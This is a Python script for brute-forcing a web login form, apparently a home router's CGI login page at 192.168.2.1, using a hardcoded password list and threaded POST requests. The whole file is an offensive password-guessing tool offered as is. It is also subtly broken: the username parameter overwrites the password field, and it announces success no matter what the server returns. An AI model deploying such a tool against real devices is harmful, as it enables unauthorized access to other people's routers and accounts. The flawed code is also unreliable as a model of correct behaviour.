import urllib3
from urllib import parse, request, error
import time
import threading


class Bruter:

    baseUrl = "http://192.168.2.1/"
    passwords = ["d41d8cd98f00b204e9800998ecf8427e", "ef21cdedfaedfad21124ceff", 312545405042, 454545454212454, 89785212477025]
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    passwordField = ''
    usernameField = ''

    def __init__(self, loginUrl=None, parameters={}, passwordField=None, usernameField=None):
        if loginUrl:
           self.loginUrl = loginUrl
        else:
            self.loginUrl = self.baseUrl + "cgi-bin/login.exe"
        if parameters:
            self.parameters = parameters
        if passwordField:
            self.passwordField = passwordField
        if usernameField:
            self.passwordField = usernameField

    def startBruteforce(self):
        print("[!] Starting brutal force on %s" % self.loginUrl)
        for password in self.passwords:
            time.sleep(1)
            threading.Thread(target=self.attemptLogin, args=[password]).start()

    def attemptLogin(self, password=None):
        print("[>] Trying %s" % self.parameters)

        if password:
            self.parameters[self.passwordField] = password

        parameters = parse.urlencode(self.parameters).encode("utf8")
        request_ = request.Request(self.loginUrl, data=parameters, headers=self.headers, method="POST")

        try:
            response = request.urlopen(request_)
            response = response.read()

        except error.HTTPError as e:
            print(str(e.code))
            pass

        print("..and we're in.. \n " + response.decode("utf8"))


passwordField = "pws"
bruter = Bruter(passwordField=passwordField, parameters={passwordField: 'pienukas'})
bruter.attemptLogin()
